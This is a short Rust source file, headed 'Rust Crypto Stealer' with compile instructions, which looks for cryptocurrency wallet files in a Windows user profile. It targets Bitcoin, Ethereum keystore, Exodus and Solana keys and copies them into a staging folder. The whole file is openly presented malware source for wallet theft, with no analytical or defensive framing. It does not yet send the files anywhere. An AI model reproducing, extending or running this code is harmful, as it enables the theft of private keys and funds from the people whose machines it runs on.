// ============================================================
// stealer.rs - Rust Crypto Stealer
// Compile: rustc -C opt-level=3 stealer.rs
// ============================================================

use std::fs;
use std::path::PathBuf;
use std::env;

fn main() {
    let user_profile = env::var("USERPROFILE").unwrap();
    let output_dir = PathBuf::from("C:\\StealerData\\crypto");
    fs::create_dir_all(&output_dir).unwrap();
    
    let wallet_paths = vec![
        "\\AppData\\Roaming\\Bitcoin\\wallet.dat",
        "\\AppData\\Roaming\\Ethereum\\keystore",
        "\\AppData\\Roaming\\Exodus\\exodus.wallet",
        "\\.bitcoin\\wallet.dat",
        "\\.solana\\id.json",
    ];
    
    for path in wallet_paths {
        let full_path = PathBuf::from(&user_profile).join(path.trim_start_matches('\\'));
        if full_path.exists() {
            let dest = output_dir.join(full_path.file_name().unwrap());
            let _ = fs::copy(&full_path, &dest);
        }
    }
}